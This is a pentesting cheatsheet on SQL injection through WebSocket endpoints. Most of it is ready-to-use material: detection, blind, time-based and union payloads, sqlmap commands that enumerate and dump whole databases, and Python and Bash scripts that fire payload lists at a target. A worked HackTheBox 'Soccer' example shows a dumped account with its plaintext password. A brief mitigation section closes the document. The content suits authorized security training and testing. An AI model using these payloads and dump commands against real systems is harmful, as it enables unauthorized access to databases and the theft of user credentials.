+++
title = 'WebSocket SQL Injection Cheatsheet'
date = '2024-01-01'
draft = false
description = 'Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections'
tags = ['websocket', 'sql-injection', 'web-security', 'pentesting']
categories = ['cheatsheets']
+++

# WebSocket SQL Injection Cheatsheet

## WebSocket Basics

### WebSocket Connection
```javascript
// Basic WebSocket connection
var ws = new WebSocket("ws://target.com:9091");

// With specific endpoint
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

// Secure WebSocket
var wss = new WebSocket("wss://target.com:443/ws");
```

### WebSocket Message Format
```javascript
// JSON message format
ws.send(JSON.stringify({
    "id": "value_to_test"
}))

// Simple string message
ws.send("test_value")

// Complex JSON structure
ws.send(JSON.stringify({
    "action": "query",
    "data": {
        "id": "vulnerable_parameter"
    }
}))
```

---

## Testing WebSocket Connections

### Manual Browser Testing
```javascript
// Open browser console and connect
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

ws.onopen = function(e) {
    console.log('Connected to WebSocket');
}

ws.onmessage = function(e) {
    console.log('Received:', e.data);
}

// Send test payloads
ws.send(JSON.stringify({"id": "1"}))
ws.send(JSON.stringify({"id": "1'"}))
ws.send(JSON.stringify({"id": "1' OR '1'='1"}))
```

### Using wscat
```bash
# Install wscat
npm install -g wscat

# Connect to WebSocket
wscat -c ws://soc-player.soccer.htb:9091

# Send JSON payloads
> {"id":"1"}
> {"id":"1'"}
> {"id":"1 OR 1=1"}
> {"id":"92130 or 5=1-- -"}
```

---

## SQL Injection Detection

### Basic Detection Payloads
```json
// Test for errors with single quote
{"id": "'"}

// Test for boolean conditions
{"id": "1 AND 1=1"}
{"id": "1 AND 1=2"}

// Test for time delays
{"id": "1 AND SLEEP(5)"}
{"id": "1'; WAITFOR DELAY '0:0:5'--"}

// Test for union-based injection
{"id": "1 UNION SELECT 1,2,3"}
```

### Error-Based Detection
```json
// MySQL error triggers
{"id": "1'"}
{"id": "1\""}
{"id": "1`"}

// SQL Server error triggers
{"id": "1'"}
{"id": "1]"}

// PostgreSQL error triggers
{"id": "1'"}
{"id": "1$"}
```

### Boolean-Based Detection
```json
// True condition
{"id": "92130 or 5=5-- -"}

// False condition  
{"id": "92130 or 5=6-- -"}

// String comparison
{"id": "1' OR 'a'='a'-- -"}
{"id": "1' OR 'a'='b'-- -"}
```

---

## sqlmap with WebSockets

### Basic sqlmap Usage
```bash
# Test WebSocket with JSON payload
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch

# With specific risk and level
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch

# Enable threading for faster execution
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10
```

### Database Enumeration
```bash
# Enumerate databases
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --dbs --batch

# Enumerate tables in specific database
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' -D soccer_db --tables --batch

# Dump specific table
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' -D soccer_db -T accounts --dump --batch

# Dump all data from database
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' -D soccer_db --dump --batch
```

### Advanced sqlmap Options
```bash
# Force specific DBMS
sqlmap -u 'ws://target:9091/' --data '{"id":"*"}' --dbms=mysql --batch

# Custom tamper scripts
sqlmap -u 'ws://target:9091/' --data '{"id":"*"}' --tamper=space2comment --batch

# Specify injection technique
sqlmap -u 'ws://target:9091/' --data '{"id":"*"}' --technique=BT --batch

# Save session
sqlmap -u 'ws://target:9091/' --data '{"id":"*"}' --batch --session-file=session.db
```

---

## Manual Exploitation Techniques

### Boolean-Based Blind Injection
```json
// Check for MySQL
{"id": "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0-- -"}

// Extract database name length
{"id": "1' AND LENGTH(database()) = 9-- -"}

// Extract database name character by character
{"id": "1' AND SUBSTRING(database(),1,1) = 's'-- -"}
{"id": "1' AND SUBSTRING(database(),2,1) = 'o'-- -"}

// Extract table names
{"id": "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -"}
{"id": "1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'accounts'-- -"}
```

### Time-Based Blind Injection
```json
// MySQL time delays
{"id": "1' AND SLEEP(5)-- -"}
{"id": "1' AND IF(LENGTH(database())=9,SLEEP(5),0)-- -"}

// SQL Server time delays
{"id": "1'; WAITFOR DELAY '0:0:5'-- -"}
{"id": "1'; IF (LEN(DB_NAME())=9) WAITFOR DELAY '0:0:5'-- -"}

// PostgreSQL time delays
{"id": "1' AND (SELECT 1 FROM pg_sleep(5))-- -"}

// Conditional time delays
{"id": "1' AND (CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END)-- -"}
```

### Union-Based Injection
```json
// Determine number of columns
{"id": "1' ORDER BY 1-- -"}
{"id": "1' ORDER BY 2-- -"}
{"id": "1' ORDER BY 3-- -"}

// Test for UNION compatibility
{"id": "1' UNION SELECT NULL-- -"}
{"id": "1' UNION SELECT NULL,NULL-- -"}

// Extract database information
{"id": "1' UNION SELECT @@version,user()-- -"}
{"id": "1' UNION SELECT database(),NULL-- -"}

// Extract table data
{"id": "1' UNION SELECT table_name,NULL FROM information_schema.tables-- -"}
{"id": "1' UNION SELECT username,password FROM accounts-- -"}
```

---

## WebSocket-Specific Payloads

### JSON Context Injection
```json
// Basic JSON structure
{"id": "1' OR '1'='1"}

// Nested JSON injection
{
    "user_data": {
        "id": "1' UNION SELECT password FROM users-- -"
    }
}

// Array-based injection
{
    "ids": ["1", "2' OR '1'='1-- -", "3"]
}
```

### Message Format Variations
```json
// Different parameter names
{"user_id": "1' OR 1=1-- -"}
{"session_id": "1' OR 1=1-- -"}
{"query": "1' OR 1=1-- -"}

// Multiple parameters
{
    "id": "1",
    "type": "user' OR 1=1-- -"
}

// Base64 encoded payloads
{"id": "MSBPUiAxPTEtLSAt"}  // 1 OR 1=1-- -
```

---

## Real-World Example: Soccer HTB

### Connection Setup
```javascript
// Target WebSocket from Soccer HTB
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

ws.onopen = function(e) {
    console.log('Connected to soccer WebSocket');
}

ws.onmessage = function(e) {
    console.log('Response:', e.data);
}
```

### Testing Process
```javascript
// 1. Test basic functionality
ws.send(JSON.stringify({"id": "1"}))

// 2. Test for SQL injection
ws.send(JSON.stringify({"id": "1'"}))

// 3. Boolean-based testing
ws.send(JSON.stringify({"id": "92130 or 5=1-- -"}))

// 4. Confirm vulnerability
ws.send(JSON.stringify({"id": "1 OR 1=1-- -"}))
```

### sqlmap Exploitation
```bash
# Soccer HTB WebSocket SQLi
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump

# Results found:
# Database: soccer_db
# Table: accounts
# [1 entry]
# +------+-------------------+----------------------+----------+
# | id   | email             | password             | username |
# +------+-------------------+----------------------+----------+
# | 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
# +------+-------------------+----------------------+----------+
```

---

## Detection and Response Analysis

### Response Analysis
```bash
# Look for different response patterns
# - Response time differences (time-based)
# - Content length variations (boolean-based)
# - Error messages (error-based)
# - Data extraction (union-based)

# Response timing measurement
time echo '{"id":"1 AND SLEEP(5)"}' | wscat -c ws://target:9091
```

### Database Fingerprinting
```json
// MySQL detection
{"id": "1' AND @@version LIKE '%mysql%'-- -"}

// SQL Server detection  
{"id": "1' AND @@version LIKE '%Microsoft%'-- -"}

// PostgreSQL detection
{"id": "1' AND version() LIKE '%PostgreSQL%'-- -"}

// SQLite detection
{"id": "1' AND sqlite_version() IS NOT NULL-- -"}
```

---

## Automation Scripts

### Python WebSocket SQLi Script
```python
import websocket
import json
import time

def test_websocket_sqli(url, payloads):
    def on_message(ws, message):
        print(f"Response: {message}")
    
    def on_error(ws, error):
        print(f"Error: {error}")
    
    def on_close(ws, close_status_code, close_msg):
        print("Connection closed")
    
    def on_open(ws):
        print("Connected to WebSocket")
        for payload in payloads:
            data = json.dumps({"id": payload})
            print(f"Sending: {data}")
            ws.send(data)
            time.sleep(1)
        ws.close()
    
    ws = websocket.WebSocketApp(url,
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.run_forever()

# Usage
payloads = [
    "1",
    "1'",
    "1' OR '1'='1",
    "1' AND SLEEP(5)-- -",
    "1 UNION SELECT @@version-- -"
]

test_websocket_sqli("ws://target:9091", payloads)
```

### Bash Testing Script
```bash
#!/bin/bash

# WebSocket SQLi Testing Script
URL="ws://soc-player.soccer.htb:9091"

echo "Testing WebSocket SQL Injection"
echo "Target: $URL"

# Array of payloads to test
payloads=(
    "1"
    "1'"
    "1' OR '1'='1-- -"
    "92130 or 5=1-- -"
    "1 AND SLEEP(5)-- -"
    "1 UNION SELECT @@version-- -"
)

for payload in "${payloads[@]}"; do
    echo "Testing payload: $payload"
    echo "{\"id\":\"$payload\"}" | wscat -c $URL
    echo "---"
    sleep 2
done
```

---

## Mitigation and Prevention

### Secure WebSocket Implementation
```javascript
// Input validation
function validateInput(data) {
    // Whitelist allowed characters
    if (!/^[a-zA-Z0-9_-]+$/.test(data)) {
        throw new Error("Invalid input");
    }
    return data;
}

// Parameterized queries
const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId], callback);

// Prepared statements
const stmt = db.prepare("SELECT * FROM users WHERE id = ?");
stmt.run(userId);
```

### WebSocket Security Headers
```javascript
// Implement proper authentication
ws.on('connection', function(socket, request) {
    // Verify JWT token or session
    if (!isAuthenticated(request)) {
        socket.close(1008, 'Authentication required');
        return;
    }
});

// Rate limiting
const rateLimiter = new Map();
ws.on('message', function(data) {
    const clientId = getClientId(this);
    if (isRateLimited(clientId)) {
        this.close(1008, 'Rate limit exceeded');
        return;
    }
});
```

---

## Tools and Resources

### WebSocket Testing Tools
- **wscat** - Command-line WebSocket client
- **Burp Suite** - Professional WebSocket testing
- **OWASP ZAP** - Free WebSocket proxy
- **websocat** - Advanced WebSocket client
- **sqlmap** - Automated SQL injection testing

### Browser Developer Tools
```javascript
// Chrome/Firefox WebSocket inspection
// 1. Open Developer Tools (F12)
// 2. Go to Network tab
// 3. Filter by WS (WebSocket)
// 4. Interact with application
// 5. Analyze WebSocket frames
```

---

*WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.*